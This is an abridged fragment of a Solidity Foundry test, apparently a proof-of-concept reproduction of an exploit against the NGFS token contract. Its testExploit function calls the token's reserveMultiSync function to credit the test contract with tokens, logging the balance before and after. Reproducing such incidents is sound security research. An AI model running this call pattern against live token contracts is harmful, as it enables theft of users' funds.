...
contract NGFS is Test {
    ...
    function testExploit() public {
        ...
        console.log(
            "Before reserveMultiSync, this contract NGFS_Token Balance is:",
            INGFSToken(NGFS_TOKEN).balanceOf(address(this))
        );
        INGFSToken(NGFS_TOKEN).reserveMultiSync(address(this), balance);
        console.log(
            "After reserveMultiSync, this contract NGFS_Token Balance is:",
            INGFSToken(NGFS_TOKEN).balanceOf(address(this))
        );
